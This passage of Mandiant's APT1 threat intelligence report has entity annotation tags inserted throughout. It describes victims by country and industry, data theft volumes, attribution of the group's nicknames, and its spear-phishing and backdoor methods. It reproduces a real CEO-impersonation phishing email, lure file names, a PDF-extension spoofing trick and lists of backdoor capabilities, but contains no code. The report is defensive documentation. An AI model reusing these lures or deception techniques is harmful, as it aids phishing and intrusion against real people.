1 <COUNTRY>Belgium</COUNTRY>

115 <COUNTRY>United States</COUNTRY>

2 <COUNTRY>Canada</COUNTRY>

OBSERVED GLOBAL <THREAT_ACTOR>APT1</THREAT_ACTOR> ACTIVITY

FIGure 11: Geographic location of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s victims. In the case of victims with a multinational presence, the 
location shown reflects either the branch of the organization that <THREAT_ACTOR>APT1</THREAT_ACTOR> compromised (when known), or else is the 
location of the organization’s headquarters.

<THREAT_ACTOR>APT1</THREAT_ACTOR> has demonstrated the capability and intent to steal from dozens of organizations across a wide range of 
industries virtually simultaneously. Figure 12 provides a view of the earliest known date of <THREAT_ACTOR>APT1</THREAT_ACTOR> activity against all of 
the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that <THREAT_ACTOR>APT1</THREAT_ACTOR>’s 
mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous 
range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction 
of <THREAT_ACTOR>APT1</THREAT_ACTOR> victims that we confirmed directly, the range of industries that <THREAT_ACTOR>APT1</THREAT_ACTOR> targets may be even broader than our 
findings suggest.

Further, the scope of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s parallel activities implies that the group has significant personnel and technical resources 
at its disposal. <TIMESTAMP>In the first month of 2011</TIMESTAMP>, for example, Figure 12 shows that <THREAT_ACTOR>APT1</THREAT_ACTOR> successfully compromised 17 
new victims operating in 10 different industries. Since we have seen that the group remains active in each victim’s 
network for an average of nearly a year after the initial date of compromise, we infer that <THREAT_ACTOR>APT1</THREAT_ACTOR> committed these 17 
new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously 
compromised victims.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 23 www.mandiant.com

<INDUSTRY>Aerospace</INDUSTRY>

<INDUSTRY>Chemicals</INDUSTRY>

<INDUSTRY>Construction and Manufacturing</INDUSTRY>

<INDUSTRY>Education</INDUSTRY>

<INDUSTRY>Energy</INDUSTRY>

<INDUSTRY>Engineering Services</INDUSTRY>

<INDUSTRY>Financial Services</INDUSTRY>

<INDUSTRY>Food and Agriculture</INDUSTRY>

<INDUSTRY>Healthcare</INDUSTRY>

<INDUSTRY>High-Tech Electronics</INDUSTRY>

<INDUSTRY>Information Technology</INDUSTRY>

<INDUSTRY>Legal Services</INDUSTRY>

<INDUSTRY>Media, Advertising and Entertainment</INDUSTRY>

<INDUSTRY>Metals and Mining</INDUSTRY>

<INDUSTRY>Navigation</INDUSTRY>

<INDUSTRY>Public Administration</INDUSTRY>

<INDUSTRY>Satellites and Telecommunications</INDUSTRY>

<INDUSTRY>Scientific Research and Consulting</INDUSTRY>

<INDUSTRY>Transportation</INDUSTRY>

<TIMESTAMP>2006</TIMESTAMP> <TIMESTAMP>2007</TIMESTAMP> <TIMESTAMP>2008</TIMESTAMP> <TIMESTAMP>2009</TIMESTAMP> <TIMESTAMP>2010</TIMESTAMP> <TIMESTAMP>2011</TIMESTAMP> <TIMESTAMP>2012</TIMESTAMP>

TIMELINE OF <THREAT_ACTOR>APT1</THREAT_ACTOR> COMPROMISES BY INDUSTRY SECTOR

International Organizations

FIGure 12: timeframe of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s cyber espionage operations against organizations by industry. the dots within 
each bar represent the earliest known date on which <THREAT_ACTOR>APT1</THREAT_ACTOR> compromised a new organization within the industry.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 24 www.mandiant.com

We believe that organizations in all industries related to <COUNTRY>China</COUNTRY>’s strategic priorities are potential targets of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s 
comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more  
heavily than others (see Figure 13), our observations confirm that <THREAT_ACTOR>APT1</THREAT_ACTOR> has targeted at least four of the seven  
strategic emerging industries that <COUNTRY>China</COUNTRY> identified in its 12th Five Year Plan.28 

0 5 10 15 20

0 5 10 15 20

<INDUSTRY>Information Technology</INDUSTRY>

<INDUSTRY>Aerospace</INDUSTRY>

<INDUSTRY>Public Administration</INDUSTRY>

<INDUSTRY>Satellites and Telecommunications</INDUSTRY>

<INDUSTRY>Scientific Research and Consulting</INDUSTRY>

<INDUSTRY>Energy</INDUSTRY>

<INDUSTRY>Transportation</INDUSTRY>

<INDUSTRY>Construction and Manufacturing</INDUSTRY>

<INDUSTRY>Engineering Services</INDUSTRY>

<INDUSTRY>High-tech Electronics</INDUSTRY>

<INDUSTRY>International Organizations</INDUSTRY>

<INDUSTRY>Legal Services</INDUSTRY>

<INDUSTRY>Media, Advertising and Entertainment</INDUSTRY>

<INDUSTRY>Navigation</INDUSTRY>

<INDUSTRY>Chemicals</INDUSTRY>

<INDUSTRY>Financial Services</INDUSTRY>

<INDUSTRY>Food and Agriculture</INDUSTRY>

<INDUSTRY>Healthcare</INDUSTRY>

<INDUSTRY>Metals and Mining</INDUSTRY>

<INDUSTRY>Education</INDUSTRY>

Industries Compromised by <THREAT_ACTOR>APT1</THREAT_ACTOR>

FIGure 13: number of <THREAT_ACTOR>APT1</THREAT_ACTOR> victims by industry. we determined each organization’s industry based on reviewing 
its industry classification in the hoover’s29 system. we also considered the content of the data that <THREAT_ACTOR>APT1</THREAT_ACTOR> stole in 
each case, to the extent that this information was available.

28  <IDENTITY>Joseph Casey</IDENTITY> and <IDENTITY>Katherine Koleski</IDENTITY>, Backgrounder: <COUNTRY>China</COUNTRY>’s 12th Five-Year Plan, <COUNTRY>U.S.</COUNTRY>-<COUNTRY>China</COUNTRY> Economic & Security Review Commission (<TIMESTAMP>2011</TIMESTAMP>), 
19, http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed <TIMESTAMP>February 3, 2013</TIMESTAMP>.
29  http://www.hoovers.com/

http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf


<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 25 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR> Data Theft

<THREAT_ACTOR>APT1</THREAT_ACTOR> steals a broad range of information from its victims. The types of information the group has stolen relate to:

»» product development and use, including information on test results, system designs, product manuals, parts lists, 
and simulation technologies;

»» manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management 
processes;

»» business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, 
joint ventures, and acquisitions;

»» policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-
ranking personnel; 

»» emails of high-ranking employees; and

»» user credentials and network architecture information.

It is often difficult for us to estimate how much data <THREAT_ACTOR>APT1</THREAT_ACTOR> has stolen during their intrusions for several reasons:

»» <THREAT_ACTOR>APT1</THREAT_ACTOR> deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually 
overwritten during normal business activities.

»» Pre-existing network security monitoring rarely records or identifies the data theft.

»» The duration of time between the data theft and <ORG>Mandiant</ORG>’s investigation is often too great, and the trace evidence 
of data theft is overwritten during the normal course of business. 

»» Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating 
and understanding the impact of the security breach.

Even with these challenges, we have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> steal as much as 6.5 terabytes of compressed data from a 
single organization over a ten-month time period. Given the scope of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s operations, including the number of 
organizations and industries we have seen them target, along with the volume of data they are clearly capable of 
stealing from any single organization, <THREAT_ACTOR>APT1</THREAT_ACTOR> has likely stolen hundreds of terabytes from its victims.

Largest <THREAT_ACTOR>APT1</THREAT_ACTOR> data theft 
from a single organization:

6.5 Terabytes

over 10 months

Although we do not have direct evidence indicating who receives the information 
that <THREAT_ACTOR>APT1</THREAT_ACTOR> steals or how the recipient processes such a vast volume of data, we 
do believe that this stolen information can be used to obvious advantage by the 
PRC and Chinese state-owned enterprises. As an example, in <TIMESTAMP>2008</TIMESTAMP>, <THREAT_ACTOR>APT1</THREAT_ACTOR> 
compromised the network of a company involved in a wholesale industry. <THREAT_ACTOR>APT1</THREAT_ACTOR> 
installed tools to create compressed file archives and to extract emails and 
attachments. <TIMESTAMP>Over the following 2.5 years</TIMESTAMP>, <THREAT_ACTOR>APT1</THREAT_ACTOR> stole an unknown number of 
files from the victim and repeatedly accessed the email accounts of several 
executives, including the CEO and General Counsel. <TIMESTAMP>During this same time period</TIMESTAMP>, major news organizations reported that <COUNTRY>China</COUNTRY> had successfully 

negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This 
may be coincidental; however, it would be surprising if <THREAT_ACTOR>APT1</THREAT_ACTOR> could continue perpetrating such a broad mandate of 
cyber espionage and data theft if the results of the group’s efforts were not finding their way into the hands of entities 
able to capitalize on them. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 26 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR> In The News

Public reporting corroborates and extends our observations of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s cyber espionage activity. However, several factors 
complicate the process of compiling and synthesizing public reports on <THREAT_ACTOR>APT1</THREAT_ACTOR>. For one thing, information security 
researchers and journalists refer to <THREAT_ACTOR>APT1</THREAT_ACTOR> by a variety of names. In addition, many cyber security analysts focus on 
writing about tools that are shared between multiple Chinese <THREAT_ACTOR>APT</THREAT_ACTOR> groups without differentiating between the various 
actors that use them.

To assist researchers in identifying which public reports describe the threat group that we identify as <THREAT_ACTOR>APT1</THREAT_ACTOR>, Table 
3 provides a list of <THREAT_ACTOR>APT</THREAT_ACTOR> group nicknames that frequently appear in the media and differentiates between those that 
describe <THREAT_ACTOR>APT1</THREAT_ACTOR> and those that do not. In addition, below is a list of public reports about Chinese threat actors that we 
have confirmed as referring to <THREAT_ACTOR>APT1</THREAT_ACTOR>.

»» The earliest known public report about <THREAT_ACTOR>APT1</THREAT_ACTOR> infrastructure is a <TIMESTAMP>2006</TIMESTAMP> publication from the Japanese division of 
<ORG>Symantec</ORG>.30 The report calls out the hostname <IOC>sb.hugesoft.org</IOC>, which is registered to an <THREAT_ACTOR>APT1</THREAT_ACTOR> persona known as 
<IDENTITY>Ugly Gorilla</IDENTITY> (discussed later in this report).

»» In <TIMESTAMP>September 2012</TIMESTAMP>, <IDENTITY>Brian Krebs</IDENTITY> of the “Krebs on Security” cybercrime blog reported on a security breach at <ORG>Telvent Canada Ltd</ORG> (now <ORG>Schneider Electric</ORG>), which we attributed to <THREAT_ACTOR>APT1</THREAT_ACTOR> based on the tools and infrastructure 
that the hackers used to exploit and gain access to the system.31

taBLe 3: Identifying <THREAT_ACTOR>APT1</THREAT_ACTOR> nicknames in the news

nickname Verdict

<THREAT_ACTOR>Comment Crew</THREAT_ACTOR> Confirmed <THREAT_ACTOR>APT1</THREAT_ACTOR>

<THREAT_ACTOR>Comment Group</THREAT_ACTOR> Confirmed <THREAT_ACTOR>APT1</THREAT_ACTOR>

<THREAT_ACTOR>Shady Rat</THREAT_ACTOR> Possibly <THREAT_ACTOR>APT1</THREAT_ACTOR> (not confirmed)

<THREAT_ACTOR>nitro</THREAT_ACTOR> attacks Not <THREAT_ACTOR>APT1</THREAT_ACTOR>; Attributed to another tracked <THREAT_ACTOR>APT</THREAT_ACTOR> group

<THREAT_ACTOR>elderwood</THREAT_ACTOR> Not <THREAT_ACTOR>APT1</THREAT_ACTOR>; Attributed to another tracked <THREAT_ACTOR>APT</THREAT_ACTOR> group

<THREAT_ACTOR>sykipot</THREAT_ACTOR> Not <THREAT_ACTOR>APT1</THREAT_ACTOR>; Attributed to another tracked <THREAT_ACTOR>APT</THREAT_ACTOR> group

<THREAT_ACTOR>aurora</THREAT_ACTOR> Not <THREAT_ACTOR>APT1</THREAT_ACTOR>; Attributed to another tracked <THREAT_ACTOR>APT</THREAT_ACTOR> group

<THREAT_ACTOR>night Dragon</THREAT_ACTOR> Not <THREAT_ACTOR>APT1</THREAT_ACTOR>; Attributed to another tracked <THREAT_ACTOR>APT</THREAT_ACTOR> group

»» A <ORG>SCADA</ORG> security company by the name of <ORG>Digital Bond</ORG> published a report of spear phishing against its company 
<TIMESTAMP>IN June 2012</TIMESTAMP>.32 AlienVault provided analysis on the associated malware.33 Indicators included in the report have 
been attributed as part of <THREAT_ACTOR>APT1</THREAT_ACTOR> infrastructure.

»» <TIMESTAMP>In November 2012</TIMESTAMP>, <ORG>Bloomberg</ORG>’s <IDENTITY>Chloe Whiteaker</IDENTITY> authored a piece on a Chinese threat group called “<THREAT_ACTOR>Comment Group</THREAT_ACTOR>,” which described the various tools and domains used by <THREAT_ACTOR>APT1</THREAT_ACTOR> persona <IDENTITY>Ugly Gorilla</IDENTITY>.34

30  <ORG>Symantec</ORG>, “Backdoor.Wualess,” <ORG>Symantec</ORG> Security Response (<TIMESTAMP>2007</TIMESTAMP>), http://www.symantec.com/ja/jp/security_response/print_writeup.
jsp?docid=2006-101116-1723-99, accessed <TIMESTAMP>February 3, 2013</TIMESTAMP>.
31  <IDENTITY>Brian Krebs</IDENTITY>, “Chinese Hackers Blamed for Intrusion at Energy Industry Giant Telvent,” Krebs on Security (<TIMESTAMP>2012</TIMESTAMP>) http://krebsonsecurity.
com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/, accessed <TIMESTAMP>February 3, 2013</TIMESTAMP>
32 <IDENTITY>Reid Wightman</IDENTITY>, “Spear Phishing Attempt,” <ORG>Digital Bond</ORG> (<TIMESTAMP>2012</TIMESTAMP>), https://www.digitalbond.com/blog/2012/06/07/spear-phishing-attempt/, accessed 
<TIMESTAMP>February 3, 2013</TIMESTAMP>.
33 <IDENTITY>Jaime Blasco</IDENTITY>, “Unveiling a spearphishing campaign and possible ramifications,” <ORG>Alien Vault</ORG> (<TIMESTAMP>2012</TIMESTAMP>), http://labs.alienvault.com/labs/index.
php/2012/unveiling-a-spearphishing-campaign-and-possible-ramifications/, accessed <TIMESTAMP>February 3, 2013</TIMESTAMP>.
34 <IDENTITY>Chloe Whiteaker</IDENTITY>, “Following the Hackers’ Trail,” <ORG>Bloomberg</ORG>, (<TIMESTAMP>2012</TIMESTAMP>) http://go.bloomberg.com/multimedia/following-hackers-trail/, accessed 
<TIMESTAMP>February 3, 2013</TIMESTAMP>.

http://www.symantec.com/ja/jp/security_response/print_writeup.jsp?docid=2006-101116-1723-99
http://www.symantec.com/ja/jp/security_response/print_writeup.jsp?docid=2006-101116-1723-99
http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/
http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/


<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 27 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR>: attaCk LIFeCyCLe

<THREAT_ACTOR>APT1</THREAT_ACTOR> has a well-defined attack methodology, honed over years and designed to steal massive quantities of intellectual 
property. They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting 
compressed bundles of files to <COUNTRY>China</COUNTRY> – before beginning the cycle again. They employ good English — with acceptable 
slang — in their socially engineered emails. They have evolved their digital weapons for more than seven years, 
resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment 
and spread across systems makes them effective in enterprise environments with trust relationships. 

These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of <ORG>Mandiant</ORG>’s 
Attack Lifecycle model. In each stage we will discuss <THREAT_ACTOR>APT1</THREAT_ACTOR>’s specific techniques to illustrate their tenacity and the 
scale at which they operate. (See Appendix B: “APT and the Attack Lifecycle” for a high-level overview of the steps 
most <THREAT_ACTOR>APT</THREAT_ACTOR> groups take in each stage of the Attack Lifecycle.)

Initial
Recon

Initial
Compromise

Establish
Foothold

Escalate
Privileges

Complete
Mission

Internal
Recon

Move
Laterally

Maintain
Presence

FIGure 14: <ORG>Mandiant</ORG>’s attack Lifecycle Model



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 28 www.mandiant.com

The Initial Compromise

The Initial Compromise represents the methods intruders use to first penetrate a target organization’s network. As with 
most other <THREAT_ACTOR>APT</THREAT_ACTOR> groups, spear phishing is <THREAT_ACTOR>APT1</THREAT_ACTOR>’s most commonly used technique. The spear phishing emails contain 
either a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are 
usually relevant to the recipient. <THREAT_ACTOR>APT1</THREAT_ACTOR> also creates webmail accounts using real peoples’ names — names that are 
familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel 
— and uses these accounts to send the emails. As a real-world example, this is an email that <THREAT_ACTOR>APT1</THREAT_ACTOR> sent to <ORG>Mandiant</ORG> 
employees:

Date: <TIMESTAMP>Wed, 18 Apr 2012 06:31:41</TIMESTAMP> -0700
From: <IDENTITY>Kevin Mandia</IDENTITY> < <IOC>kevin.mandia@rocketmail.com</IOC> >
Subject: Internal Discussion on the Press 
Release

Hello,
Shall we schedule a time to meet next week?
We need to finalize the press release.
Details click here.

<IDENTITY>Kevin Mandia</IDENTITY>

FIGure 15: <THREAT_ACTOR>APT1</THREAT_ACTOR> spear Phishing email 

At first glance, the email appeared to be from <ORG>Mandiant</ORG>’s CEO, <IDENTITY>Kevin Mandia</IDENTITY>. However, further scrutiny shows that 
the email was not sent from a <ORG>Mandiant</ORG> email account, but from “<IOC>kevin.mandia@rocketmail.com</IOC>”. <SOFTWARE>Rocketmail</SOFTWARE> is a 
free webmail service. The account “<IOC>kevin.mandia@rocketmail.com</IOC>” does not belong to <IDENTITY>Mr. Mandia</IDENTITY>. Rather, an <THREAT_ACTOR>APT1</THREAT_ACTOR> 
actor likely signed up for the account specifically for this spear phishing event. If anyone had clicked on the link that 
day (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named “<IOC>Internal_Discussion_Press_Release_In_Next_Week8.zip</IOC>”. This file contained a malicious executable that installs a custom <THREAT_ACTOR>APT1</THREAT_ACTOR> 
backdoor that we call <MALWARE>WEBC2-TABLE</MALWARE>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 29 www.mandiant.com

Although the files that <THREAT_ACTOR>APT1</THREAT_ACTOR> actors attach or link to spear phishing emails are not always in ZIP format, this is the 
predominant trend we have observed in the last several years. Below is a sampling of file names that <THREAT_ACTOR>APT1</THREAT_ACTOR> has used 
with their malicious ZIP files:

<IOC>2012ChinaUSAviationSymposium.zip</IOC> 
<IOC>Employee-Benefit-and-Overhead-Adjustment-Keys.zip</IOC>
<IOC>MARKET-COMMENT-Europe-Ends-Sharply-Lower-On-Data-Yields-Jump.zip</IOC>
<IOC>Negative_Reports_Of_Turkey.zip</IOC>
<IOC>New_Technology_For_FPGA_And_Its_Developing_Trend.zip</IOC>
<IOC>North_Korean_launch.zip</IOC>
<IOC>Oil-Field-Services-Analysis-And-Outlook.zip</IOC>
<IOC>POWER_GEN_2012.zip</IOC>
<IOC>Proactive_Investors_One2One_Energy_Investor_Forum.zip</IOC>
<IOC>Social-Security-Reform.zip</IOC>
<IOC>South_China_Sea_Security_Assessment_Report.zip</IOC>
<IOC>Telephonics_Supplier_Manual_v3.zip</IOC>
<IOC>The_Latest_Syria_Security_Assessment_Report.zip</IOC>
<IOC>Updated_Office_Contact_v1.zip</IOC>
<IOC>Updated_Office_Contact_v2.zip</IOC>
<IOC>Welfare_Reform_and_Benefits_Development_Plan.zip</IOC>

Spear Phishing Email
with Attachment

@

What’s this 
email?

Is this for real?

@

@
!“It’s legit.”

Okay, thanks!

<THREAT_ACTOR>APT 1</THREAT_ACTOR>

<THREAT_ACTOR>APT 1</THREAT_ACTOR>

<THREAT_ACTOR>APT 1</THREAT_ACTOR>

The example file names include military, 
economic, and diplomatic themes, 
suggesting the wide range of industries that 
<THREAT_ACTOR>APT1</THREAT_ACTOR> targets. Some names are also generic 
(e.g., “<IOC>updated_office_contact_v1.zip</IOC>”) and 
could be used for targets in any industry.

On some occasions, unsuspecting email 
recipients have replied to the spear 
phishing messages, believing they were 
communicating with their acquaintances. 
In one case a person replied, “I’m not sure 
if this is legit, so I didn’t open it.” Within 20 
minutes, someone in <THREAT_ACTOR>APT1</THREAT_ACTOR> responded with 
a terse email back: “It’s legit.” 

 

FIGure 16: <THREAT_ACTOR>APT1</THREAT_ACTOR>’s interaction with a spear phishing recipient



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 30 www.mandiant.com

would you click on this?

Some <THREAT_ACTOR>APT1</THREAT_ACTOR> actors have gone to the trouble of making the malicious software inside their ZIP files look 
like benign <ORG>Adobe</ORG> PDF files. Here is an example:

This is not a PDF file. It looks like the filename has a PDF extension but the file name actually includes 
119 spaces after “.pdf” followed by “.exe” — the real file extension. <THREAT_ACTOR>APT1</THREAT_ACTOR> even went to the trouble of 
turning the executable’s icon to an <ORG>Adobe</ORG> symbol to complete the ruse. However, this file is actually a 
dropper for a custom <THREAT_ACTOR>APT1</THREAT_ACTOR> backdoor that we call <MALWARE>WEBC2-QBP</MALWARE>. 

Establishing A Foothold

Establishing a foothold involves actions that ensure control of the target network’s systems from outside the network. 
<THREAT_ACTOR>APT1</THREAT_ACTOR> establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed. A 
backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, <THREAT_ACTOR>APT</THREAT_ACTOR> 
backdoors initiate outbound connections to the intruder’s “command and control” (C2) server. <THREAT_ACTOR>APT</THREAT_ACTOR> intruders employ 
this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating 
communication with systems inside the network, they are less reliable at keeping malware that is already inside the 
network from communicating to systems outside. 

1001100100011010100                     10010100101110001100100011010100                     
C2

FIGure 17: Backdoors installed on compromised systems usually initiate connections with C2 servers

While <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders occasionally use publicly available backdoors such as <MALWARE>Poison Ivy</MALWARE> and <MALWARE>Gh0st RAT</MALWARE>, the vast 
majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of 
backdoors in “Appendix C: The Malware Arsenal” that <THREAT_ACTOR>APT1</THREAT_ACTOR> uses that we believe are not publicly available. In addition 
we have provided 1,007 MD5 hashes associated with <THREAT_ACTOR>APT1</THREAT_ACTOR> malware in Appendix E. We will describe <THREAT_ACTOR>APT1</THREAT_ACTOR>’s backdoors 
in two categories: “<MALWARE>Beachhead Backdoors</MALWARE>” and “<MALWARE>Standard Backdoors</MALWARE>.”



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 31 www.mandiant.com

<MALWARE>Beachhead Backdoors</MALWARE>

<MALWARE>Beachhead Backdoors</MALWARE> are typically minimally 
featured. They offer the attacker a toe-hold to 
perform simple tasks like retrieve files, gather 
basic system information and trigger the 
execution of other more significant capabilities 
such as a standard backdoor.

<THREAT_ACTOR>APT1</THREAT_ACTOR>’s <MALWARE>Beachhead Backdoors</MALWARE> are usually 
what we call <MALWARE>WEBC2</MALWARE> backdoors. <MALWARE>WEBC2</MALWARE> 
backdoors are probably the most well-known 
kind of <THREAT_ACTOR>APT1</THREAT_ACTOR> backdoor, and are the reason 
why some security companies refer to <THREAT_ACTOR>APT1</THREAT_ACTOR> 
as the “<THREAT_ACTOR>Comment Crew</THREAT_ACTOR>.” A <MALWARE>WEBC2</MALWARE> backdoor 
is designed to retrieve a webpage from a C2 
server. It expects the webpage to contain 
special HTML tags; the backdoor will attempt 
to interpret the data between the tags as 
commands. Older versions of <MALWARE>WEBC2</MALWARE> read 
data between HTML comments, though over 
time <MALWARE>WEBC2</MALWARE> variants have evolved to read 
data contained within other types of tags. 
From direct observation, we can confirm 
that <THREAT_ACTOR>APT1</THREAT_ACTOR> was using <MALWARE>WEBC2</MALWARE> backdoors as 
early as <TIMESTAMP>July 2006</TIMESTAMP>. However, the first compile time35 we have for <MALWARE>WEBC2-KT3</MALWARE> is <TIMESTAMP>2004-01-23</TIMESTAMP>, suggesting that <THREAT_ACTOR>APT1</THREAT_ACTOR> 
has been crafting <MALWARE>WEBC2</MALWARE> backdoors <TIMESTAMP>since early 2004</TIMESTAMP>. Based on the 400+ samples of <MALWARE>WEBC2</MALWARE> variants that we have 
accumulated, it appears that <THREAT_ACTOR>APT1</THREAT_ACTOR> has direct access to developers who have continually released new <MALWARE>WEBC2</MALWARE> variants 
for over six years. 

For example, these two build paths, which were discovered inside <MALWARE>WEBC2-TABLE</MALWARE> samples, help to illustrate how <THREAT_ACTOR>APT1</THREAT_ACTOR> 
has been steadily building new <MALWARE>WEBC2</MALWARE> variants as part of a continuous development process:

sample a
MD5: <IOC>d7aa32b7465f55c368230bb52d52d885</IOC>
Compile date: <TIMESTAMP>2012-02-23</TIMESTAMP>
<IOC>\work\code\2008-7-8muma\mywork\winInet_winApplication2009-8-7\mywork\aaaaaaa2012-2-23\Release\aaaaaaa.pdb</IOC>

sample B
MD5: <IOC>c1393e77773a48b1eea117a302138554</IOC>
Compile date: <TIMESTAMP>2009-08-07</TIMESTAMP>
<IOC>D:\work\code\2008-7-8muma\mywork\winInet_winApplication2009-8-7\mywork\aaaaaaa\Release\aaaaaaa.pdb</IOC>

 

35 “Compile” refers to the process of transforming a programmer’s source code into a file that a computer can understand and execute. The compile 
date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.

<MALWARE>weBC2</MALWARE> families

<MALWARE>WEBC2-AUSOV</MALWARE>
<MALWARE>WEBC2-ADSPACE</MALWARE>
<MALWARE>WEBC2-BOLID</MALWARE>
<MALWARE>WEBC2-CLOVER</MALWARE>
<MALWARE>WEBC2-CSON</MALWARE>
<MALWARE>WEBC2-DIV</MALWARE>
<MALWARE>WEBC2-GREENCAT</MALWARE>
<MALWARE>WEBC2-HEAD</MALWARE>

<MALWARE>WEBC2-KT3</MALWARE>
<MALWARE>WEBC2-QBP</MALWARE>
<MALWARE>WEBC2-RAVE</MALWARE>
<MALWARE>WEBC2-TABLE</MALWARE>
<MALWARE>WEBC2-TOCK</MALWARE>
<MALWARE>WEBC2-UGX</MALWARE>
<MALWARE>WEBC2-YAHOO</MALWARE>
<MALWARE>WEBC2-Y21K</MALWARE>

… and many still uncategorized

what is a malware family?
A malware family is a collection of malware in which each 
sample shares a significant amount of code with all of 
the others. To help illustrate this, consider the following 
example from the physical world. There is now a vast array 
of computing tablets for sale. These include <ORG>Apple</ORG>’s iPad, 
<ORG>Samsung</ORG>’s Galaxy Tab, and <ORG>Microsoft</ORG>’s Surface. Although 
these are all tablet computers, “under the hood” they are 
probably quite different. However, one can expect that 
an iPad 1 and an iPad 2 share a significant number of 
components — much more than, say, an iPad 1 and a 
<ORG>Microsoft</ORG> Surface. Thus it makes sense to refer to the iPad 
“family” and the Surface “family”. 

When it comes to computer programs, in general if they 
share more than 80% of the same code we consider them 
part of the same family. There are exceptions: for example, 
some files contain public and standard code libraries that 
we do not take into consideration when making a family 
determination. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 32 www.mandiant.com

A “build path” discloses the directory from which the programmer 
built and compiled his source code. These samples, compiled 2.5 
years apart, were compiled within a folder named “work\code\...\
mywork”. The instances of “work” suggest that working on <MALWARE>WEBC2</MALWARE> is 
someone’s day job and not a side project or hobby. Furthermore, the 
Sample A build string includes “<TIMESTAMP>2012-2-23</TIMESTAMP>” — which matches Sample 
A’s compile date. The Sample B build string lacks “<TIMESTAMP>2012-2-23</TIMESTAMP>” but 
includes “<TIMESTAMP>2009-8-7</TIMESTAMP>” — which also matches Sample B’s compile date. 
This suggests that the code used to compile Sample A was modified 
from code that was used to compile Sample B 2.5 years previously. The 
existence of “<TIMESTAMP>2008-7-8</TIMESTAMP>” suggests that the code for both samples was 
modified from a version that existed in <TIMESTAMP>July 2008</TIMESTAMP>, a year before Sample 
B was created. This series of dates indicates that developing and 
modifying the <MALWARE>WEBC2</MALWARE> backdoor is an iterative and long-term process.

<MALWARE>WEBC2</MALWARE> backdoors typically give <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers a short and 
rudimentary set of commands to issue to victim systems, including:
»» Open an interactive command shell (usually Windows’ cmd.exe)
»» Download and execute a file
»» Sleep (i.e. remain inactive) for a specified amount of time

<MALWARE>WEBC2</MALWARE> backdoors are often packaged with spear phishing emails. 
Once installed, <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders have the option to tell victim systems 
to download and execute additional malicious software of their choice. 
<MALWARE>WEBC2</MALWARE> backdoors work for their intended purpose, but they generally 
have fewer features than the “<MALWARE>Standard Backdoors</MALWARE>” described below. 

<MALWARE>Standard Backdoors</MALWARE>
The standard, non-WEBC2 <THREAT_ACTOR>APT1</THREAT_ACTOR> backdoor typically communicates 
using the HTTP protocol (to blend in with legitimate web traffic) or a 
custom protocol that the malware authors designed themselves. These 
backdoors give <THREAT_ACTOR>APT</THREAT_ACTOR> intruders a laundry list of ways to control victim 
systems, including:
»» Create/modify/delete/execute programs
»» Upload/download files
»» Create/delete directories
»» List/start/stop processes
»» Modify the system registry 
»» Take screenshots of the user’s desktop
»» Capture keystrokes
»» Capture mouse movement
»» Start an interactive command shell
»» Create a Remote desktop (i.e. graphical) interface
»» Harvest passwords
»» Enumerate users
»» Enumerate other systems on the network
»» Sleep (i.e. go inactive) for a specified amount of time
»» Log off the current user
»» Shut down the system

<MALWARE>SEASALT</MALWARE>
<MALWARE>LONGRUN</MALWARE>
<MALWARE>WEBC2.TOCK</MALWARE>
<MALWARE>WEBC2.YAHOO</MALWARE>
<MALWARE>WARP TABMSGSQL</MALWARE>
<MALWARE>WEBC2.CSONWEBC2.QBP</MALWARE>
<MALWARE>COMBOSWEBC2.DIV</MALWARE>
<MALWARE>COOKIEBAG</MALWARE>
